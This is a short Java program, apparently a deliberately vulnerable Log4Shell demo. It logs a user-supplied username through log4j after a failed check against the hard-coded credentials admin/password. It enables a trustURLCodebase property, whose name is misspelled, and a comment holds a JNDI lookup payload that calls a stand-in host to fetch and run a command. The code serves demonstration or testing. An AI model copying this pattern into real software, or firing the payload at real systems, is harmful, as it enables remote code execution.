package org.example;

import org.apache.log4j.Logger;
import org.apache.log4j.LogManager;
import java.util.Scanner;


public class App {
    final static Logger logger = Logger.getLogger(App.class);

    public static void main(String[] args) {
    	
    	System.setProperty("con.sun.jndi.ldap.object.trustURLCodebase","true");
    	
    	Scanner myObj = new Scanner(System.in);
    	
    	System.out.println("Enter username");
    	String userName = myObj.nextLine();
    	System.out.println("Enter password");
        String password = myObj.nextLine();
   
        //${jndi:ldap://hax.local:1389/Basic/Command/Base64/Y2FsYy5leGU=}
      
        
        if(userName.equals("admin") && password.equals("password")){
            System.out.println("Welcome Back Admin");
        }
        else{

             
    		
            logger.error(userName);

            System.out.println("The password you entered was invalid, we will log your information");
        }
    }
}
